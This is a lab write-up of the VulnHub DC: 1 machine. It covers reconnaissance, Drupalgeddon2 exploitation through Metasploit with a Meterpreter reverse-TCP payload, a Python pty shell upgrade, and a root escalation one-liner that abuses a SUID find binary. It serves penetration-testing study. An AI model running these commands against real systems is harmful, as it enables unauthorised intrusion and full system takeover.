Target IP address: 192.168.96.25

---

Tools:
- arp-scan
- nmap
- gobuster
- WhatWeb
- Nikto
- searchsploit
- Metasploit

# 📝 Penetration Testing Report

# 🎯 VulnHub — DC: 1

> **📌 Platform:** VulnHub  
> **🖥️ Lab Machine:** DC: 1  
> **💻 Attacking Machine:** Kali Linux  
> **🌐 Environment:** Oracle VirtualBox / Host-Only Network  
> **🎯 Target IP Address:** `192.168.96.25`

---

# 📖 1. Overview

The objective of this assessment was to obtain full control over the **DC: 1** virtual machine, starting with host discovery and ending with `root` privileges.

During the assessment, a web service running **Drupal 7** was identified. The web server and PHP versions were also found to be outdated. After identifying the Drupal version, publicly available exploits were researched.

The main attack vector was **Drupalgeddon2**, which allowed remote code execution on the vulnerable Drupal installation.

After obtaining initial access, local enumeration was performed. A SUID-enabled `find` binary was discovered and subsequently abused to escalate privileges to `root`.

---

# 🧠 2. Attack Chain

The overall attack path was:

Host Discovery

      │

      ▼

Port Enumeration

      │

      ▼

HTTP Enumeration

      │

      ▼

Drupal Identification

      │

      ▼

Version Detection

      │

      ▼

Vulnerability Research

      │

      ▼

Drupalgeddon2

      │

      ▼

Remote Code Execution

      │

      ▼

Meterpreter Session

      │

      ▼

Shell

      │

      ▼

Local Enumeration

      │

      ▼

SUID Enumeration

      │

      ▼

SUID find

      │

      ▼

Privilege Escalation

      │

      ▼

Root Access

---

# 🛰️ 3. Host Discovery

## 🎯 Objective

The first step was to identify the target host within the local lab network.

Since the machine was deployed inside a **VirtualBox Host-Only Network**, `arp-scan` was used to discover active hosts.

sudo arp-scan -I eth1 192.168.96.0/24

The target machine was identified at:

192.168.96.25

### 🔎 Analysis

After identifying the target IP address, the next step was to enumerate its exposed network services and determine potential attack vectors.

---

# 🔍 4. Port Enumeration

## 🎯 Objective

Identify open ports, running services, software versions, and potentially interesting attack surfaces.

Nmap was used for service and OS enumeration:

nmap -sV -A -T5 192.168.96.25

The scan identified the following services:

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 6.0p1|
|80|HTTP|Apache 2.2.22|
|111|RPC|rpcbind 2–4|

The most interesting service was HTTP:

80/tcp open http Apache httpd 2.2.22 ((Debian))

Nmap also identified the web application as:

Drupal 7

The scan also revealed numerous Drupal-related entries in `robots.txt`:

/includes/

/misc/

/modules/

/profiles/

/scripts/

/themes/

/CHANGELOG.txt

/cron.php

/install.php

...

### 🔎 Analysis

At this stage, SSH and RPC did not provide an obvious path to initial access.

The HTTP service, however, immediately disclosed the CMS and its version. Therefore, further enumeration focused on the web application.

---

# 🌐 5. HTTP Enumeration

A more detailed Nmap scan was performed against the HTTP service.

80/tcp open http Apache httpd 2.2.22 ((Debian))

Several Drupal-related resources were identified:

/rss.xml

/robots.txt

/UPGRADE.txt

/INSTALL.txt

/INSTALL.mysql.txt

/INSTALL.pgsql.txt

/README

/README.txt

/0/

/user/

One particularly important result was:

/: Drupal version 7

The following directory was also identified:

/user/

which corresponds to the standard Drupal user interface.

---

# 📂 6. Directory Enumeration

To expand the web attack surface, Gobuster was used:

gobuster dir -u http://192.168.96.25/ \

-w /usr/share/wordlists/dirb/common.txt

The following standard Drupal files and directories were discovered:

includes

misc

modules

profiles

scripts

sites

themes

user

robots.txt

README

LICENSE

web.config

xmlrpc.php

However, reviewing these resources did not reveal a direct attack vector.

### 🔎 Analysis

At this point, it became clear that the main value of the web service was not a hidden directory but the installed version of Drupal itself.

Therefore, instead of continuing to enumerate standard directories, the focus shifted toward identifying vulnerabilities associated with the detected Drupal version.

---

# 🛡️ 7. Web Server Analysis with Nikto

Nikto was used for additional web server enumeration:

nikto -h http://192.168.96.25

Nikto confirmed the following versions:

Apache/2.2.22 (Debian)

PHP/5.4.45-0+deb7u14

Drupal 7.x

It also identified outdated components:

Apache/2.2.22 appears to be outdated

PHP/5.4.45-0+deb7u14 appears to be outdated

Several default Drupal files were also identified:

/INSTALL.txt

/UPGRADE.txt

/install.php

/LICENSE.txt

/INSTALL.mysql.txt

/INSTALL.pgsql.txt

Nikto also reported the absence of several modern HTTP security headers.

### 🔎 Analysis

The Nikto results reinforced the initial hypothesis:

> The target was running an outdated Apache + PHP + Drupal stack.

However, outdated software alone does not necessarily mean that a usable exploit is available. Therefore, the next step was to identify the specific Drupal version and search for a suitable exploit.

---

# 🔬 8. Technology Identification with WhatWeb

WhatWeb was used to obtain additional information about the web application:

whatweb http://192.168.96.25

The results confirmed:

Apache 2.2.22

Debian

Drupal 7

PHP 5.4.45

jQuery

The page title was also identified:

Welcome to Drupal Site | Drupal Site

### 🔎 Analysis

At this point, the following information had been collected:

OS:      Debian

Web:     Apache 2.2.22

PHP:     5.4.45

CMS:     Drupal 7

The next logical step was to research known vulnerabilities affecting Drupal 7.

---

# 💣 9. Drupal Vulnerability Research

Searchsploit was used to search for publicly available Drupal exploits:

searchsploit Drupal 7

Multiple potential exploits were identified.

To narrow down the options, the characteristics and affected versions of the discovered exploits were reviewed.

One particularly interesting result was:

Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1

- 'Drupalgeddon2' Remote Code Execution

This vulnerability allows **Remote Code Execution (RCE)** against vulnerable Drupal versions.

### 🔎 Analysis

The information collected earlier showed that the target was running Drupal 7.

The detected version was potentially within the affected range for Drupalgeddon2.

This led to the following hypothesis:

> If the installed Drupal version is vulnerable to Drupalgeddon2, it may be possible to obtain remote code execution without prior authentication.

The corresponding Metasploit module was therefore selected to test this hypothesis.

---

# 🚀 10. Exploitation — Drupalgeddon2

The corresponding Drupalgeddon2 module was located in Metasploit.

The required parameters were configured:

- `RHOST` — target IP address;
- `LHOST` — Kali Linux IP address;
- appropriate payload for obtaining a reverse connection.

The selected payload was:

php/meterpreter_reverse_tcp

After configuring the required parameters, the exploit was executed.

A successful:

Meterpreter session

was obtained.

### 🔎 Analysis

The initial hypothesis was confirmed.

The vulnerable Drupal installation allowed remote code execution, providing initial access to the target system.

---

# 🖥️ 11. Meterpreter Session Analysis

After obtaining the session, information about the target system was collected using:

sysinfo

The result was:

Computer        : DC-1

OS              : Linux DC-1 3.2.0-6-486

Architecture    : i686

System Language : C

Meterpreter     : php/linux

This confirmed:

- Hostname: `DC-1`
- Operating System: Linux
- Architecture: `i686`
- Session type: `php/linux`

A regular shell was then opened:

shell

---

# 🐚 12. Improving the Shell

The obtained shell was functional, but a proper interactive Bash shell was more convenient for further enumeration.

Python was used to spawn a pseudo-terminal:

python -c "import pty; pty.spawn('/bin/bash')"

This provided a more convenient interactive shell.

---

# 🔎 13. Local Enumeration

After obtaining shell access, basic local enumeration was performed.

The following commands were executed:

id

pwd

sudo -l

A search for SUID-enabled files was also performed:

find / -perm -4000 2>/dev/null

### 🔎 Analysis

The purpose of this stage was to determine:

- the current user;
- the current working directory;
- available `sudo` privileges;
- potentially dangerous SUID binaries.

Among the discovered SUID binaries was:

find

This was particularly interesting because `find` supports command execution through the `-exec` option.

---

# 👑 14. Privilege Escalation via SUID `find`

Since the `find` binary had the SUID bit enabled, it could execute with the privileges of its file owner.

To test whether it could be abused for privilege escalation, the following command was executed:

find . -exec /bin/sh \; -quit

As a result, a shell with elevated privileges was obtained:

root

The local privilege escalation was therefore successful.

---

# 🏆 15. Root Access

After obtaining `root` privileges, the root user's directory was inspected:

cd /root

The machine's flag was found inside the `/root` directory.

This confirmed complete compromise of the target system.

---

# 📊 16. Final Attack Chain

ARP Discovery

      │

      ▼

192.168.96.25

      │

      ▼

Nmap

      │

      ▼

Apache + Drupal 7

      │

      ▼

Gobuster / Nikto / WhatWeb

      │

      ▼

Drupal Version Identification

      │

      ▼

Searchsploit

      │

      ▼

Drupalgeddon2

      │

      ▼

Remote Code Execution

      │

      ▼

Meterpreter

      │

      ▼

Shell

      │

      ▼

Local Enumeration

      │

      ▼

SUID Enumeration

      │

      ▼

SUID find

      │

      ▼

Privilege Escalation

      │

      ▼

ROOT

      │

      ▼

Flag

---

# ⚠️ 17. Key Findings

|Finding|Risk|Impact|
|---|---|---|
|Outdated Drupal version|🔴 Critical|Potential remote code execution|
|Drupalgeddon2|🔴 Critical|Initial system compromise|
|Outdated Apache 2.2.22|🟠 High|Increased attack surface|
|Outdated PHP 5.4.45|🟠 High|Unsupported software|
|SUID-enabled `find`|🔴 Critical|Privilege escalation to `root`|
|Exposed SSH service|🟡 Medium|Additional attack surface|
|Exposed RPCbind service|🟡 Medium|Additional attack surface|

---

# 🧠 18. Decision-Making Analysis

The key characteristic of this machine was that initial access was not obtained through credential attacks or SSH exploitation.

After discovering Drupal, the decision was made to first **identify the CMS version** and then search for vulnerabilities specifically affecting that version.

The reasoning process was:

1. **ARP-scan** → discovered the target host.
2. **Nmap** → identified the HTTP service.
3. **Nmap / WhatWeb** → identified Drupal 7.
4. **Gobuster / Nikto** → discovered standard Drupal resources, but no direct attack vector.
5. **Searchsploit** → identified multiple Drupal exploits.
6. **Version analysis** → selected Drupalgeddon2 as a suitable candidate.
7. **Metasploit** → confirmed remote code execution.
8. **Meterpreter → Shell** → obtained system access.
9. **Local enumeration** → discovered the SUID `find` binary.
10. **SUID exploitation** → obtained `root` privileges.

The main lesson from this machine is:

> **Software version information is one of the most valuable results of initial enumeration.** Instead of randomly testing different attack vectors, the identified version can be correlated with known vulnerabilities, allowing the tester to prioritize the most relevant exploitation path.

---

# ✅ 19. Conclusion

The **DC: 1** machine was fully compromised during the assessment.

The primary exploitation chain consisted of two key stages.

### Initial Access

Drupal 7

   ↓

Drupalgeddon2

   ↓

Remote Code Execution

   ↓

Meterpreter

### Privilege Escalation

Shell

   ↓

SUID Enumeration

   ↓

find

   ↓

SUID Exploitation

   ↓

root

The assessment demonstrated the importance of a structured penetration-testing methodology:

**Discovery → Enumeration → Technology Identification → Vulnerability Research → Exploitation → Local Enumeration → Privilege Escalation → Compromise Validation**.